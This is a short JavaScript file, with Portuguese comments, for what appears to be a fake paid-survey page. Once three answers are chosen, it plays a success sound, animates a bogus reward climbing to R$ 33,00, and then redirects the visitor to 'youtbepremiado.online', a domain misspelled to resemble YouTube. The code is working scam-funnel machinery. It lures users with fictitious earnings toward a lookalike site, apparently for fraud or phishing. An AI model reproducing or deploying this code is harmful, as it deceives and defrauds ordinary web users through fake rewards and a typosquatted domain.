document.addEventListener('DOMContentLoaded', function() {
    const successAudio = document.getElementById('success-audio');  // ID corrigido
    const form = document.getElementById('feedback-form');
    const submitBtn = document.getElementById('submit-btn');
    const cardRedText = document.getElementById('cardRedText');
    const popup = document.getElementById('popup');
    const ganhoValue = document.getElementById('ganho-value');

    function updateButtonState() {
        const checkedCount = Array.from(form.querySelectorAll('input[type="radio"]:checked')).length;
        submitBtn.disabled = checkedCount < 3;
    }

    form.addEventListener('change', updateButtonState);

    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();  // Evita o envio do formulário

        // Verifica se o áudio foi encontrado
        if (successAudio) {
            successAudio.play().then(() => {
                console.log('Áudio reproduzido com sucesso!');
            }).catch(error => {
                console.error('Erro ao tentar reproduzir o áudio:', error);
            });
        } else {
            console.error('Elemento de áudio não encontrado.');
        }

        // Transição de valores de R$ 0,00 para R$ 33,00
        let valor = 0;
        const incremento = 3300 / 100;
        const intervalo = setInterval(() => {
            valor += incremento;
            if (valor >= 3300) {
                valor = 3300;
                clearInterval(intervalo);
            }
            cardRedText.textContent = `R$ ${(valor / 100).toFixed(2)}`;
        }, 10);

        // Exibe o popup
        popup.style.display = 'block';
        
        // Oculta o popup após 4 segundos
        setTimeout(function() {
            popup.classList.add("hidden");
            window.location.href = "https://youtbepremiado.online/muca";
        }, 4000);
    });
});
